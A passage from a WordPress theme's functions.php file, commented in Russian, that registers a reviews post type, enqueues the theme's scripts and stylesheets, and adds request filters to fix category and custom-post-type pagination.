                'parent_item_colon'  => '', // для родителей (у древовидных типов)
                'menu_name'          => 'Отзывы', // название меню
            ),
            'description'         => '',
            'public'              => true,
            'publicly_queryable'  => null, // зависит от public
            'exclude_from_search' => null, // зависит от public
            'show_ui'             => null, // зависит от public
            'show_in_menu'        => null, // показывать ли в меню адмнки
            'show_in_admin_bar'   => null, // по умолчанию значение show_in_menu
            'show_in_nav_menus'   => null, // зависит от public
            'show_in_rest'        => null, // добавить в REST API. C WP 4.7
            'rest_base'           => null, // $post_type. C WP 4.7
            'menu_position'       => null,
            'menu_icon'           => 'dashicons-thumbs-up', 
            //'capability_type'   => 'post',
            //'capabilities'      => 'post', // массив дополнительных прав для этого типа записи
            //'map_meta_cap'      => null, // Ставим true чтобы включить дефолтный обработчик специальных прав
            'hierarchical'        => false,
            'supports'            => array('title','editor'), // 'title','editor','author','thumbnail','excerpt','trackbacks','custom-fields','comments','revisions','page-attributes','post-formats'
            'taxonomies'          => array(),
            'has_archive'         => false,
            'rewrite'             => true,
            'query_var'           => true,
        ) );
    }

    register_taxonomy_for_object_type( 'project', 'cat_projects' );

add_action('wp_footer', 'add_scripts'); // приклеем ф-ю на добавление скриптов в футер
if (!function_exists('add_scripts')) { // если ф-я уже есть в дочерней теме - нам не надо её определять
    function add_scripts() { // добавление скриптов
        if(is_admin()) return false; // если мы в админке - ничего не делаем
        wp_deregister_script('jquery');
        //Подключаем основные плагины JS (Не нужные отключить!)
        wp_enqueue_script('bootstrap', get_template_directory_uri().'/js/bootstrap.min.js','','',true); // бутстрап
        wp_enqueue_script('fancybox', get_template_directory_uri().'/js/jquery.fancybox.min.js','','',true); // Библиотека Fancybox
        wp_enqueue_script('inputmask', get_template_directory_uri().'/js/jquery.inputmask.bundle.js','','',true); // Библиотека InputMask
        wp_enqueue_script('mmenu', get_template_directory_uri().'/js/jquery.mmenu.js','','',true); // Плагин бокового меню Mmenu
        wp_enqueue_script('owl-carousel', get_template_directory_uri().'/js/owl.carousel.min.js','','',true); // jQuery Карусель https://owlcarousel2.github.io/OwlCarousel2/ 
        wp_enqueue_script('ajax-form', get_template_directory_uri().'/js/jquery.form.js','','',true); // AJAX отправка форм в соответствующий файл. 
        wp_enqueue_script('main', get_template_directory_uri().'/js/main.js','','',true); // основные скрипты шаблона
    }
}

add_action('wp_print_styles', 'add_styles'); // приклеем ф-ю на добавление стилей в хедер
if (!function_exists('add_styles')) { // если ф-я уже есть в дочерней теме - нам не надо её определять
    function add_styles() { // добавление стилей
        if(is_admin()) return false; // если мы в админке - ничего не делаем
        wp_enqueue_style( 'bootstrap', get_template_directory_uri().'/css/bootstrap.min.css' ); // бутстрап
        wp_enqueue_style( 'hamburgers', get_template_directory_uri().'/css/hamburgers.min.css' ); //Подглючение hamburgers CSS
        wp_enqueue_style( 'fancybox', get_template_directory_uri().'/css/jquery.fancybox.min.css' ); //Библиотека стили FancyBox
        wp_enqueue_style( 'mmenu', get_template_directory_uri().'/css/jquery.mmenu.css' ); //Библиотека бокового меню Mmenu
        wp_enqueue_style( 'owl-carusel', get_template_directory_uri().'/css/owl.carousel.min.css' ); //jQuery Карусель https://owlcarousel2.github.io/OwlCarousel2/
        wp_enqueue_style( 'mainstyle', get_template_directory_uri().'/css/style.css' ); // основные стили шаблона
        wp_enqueue_style( 'media-css', get_template_directory_uri().'/css/media.css' ); // адаптация стилей
    }
}

function remove_page_from_query_string($query_string)
{ 
    if ($query_string['name'] == 'page' && isset($query_string['page'])) {
        unset($query_string['name']);
        list($delim, $page_index) = split('/', $query_string['page']);
        $query_string['paged'] = $page_index;
    }      
    return $query_string;
}
add_filter('request', 'remove_page_from_query_string');
 
function fix_category_pagination($qs){
    if(isset($qs['category_name']) && isset($qs['paged'])){
        $qs['post_type'] = get_post_types($args = array(
            'public'   => true,
            '_builtin' => false
        ));
        array_push($qs['post_type'],'post');
    }
    return $qs;
}
add_filter('request', 'fix_category_pagination');

require (get_template_directory().'/tgm/custom_theme.php');
?>
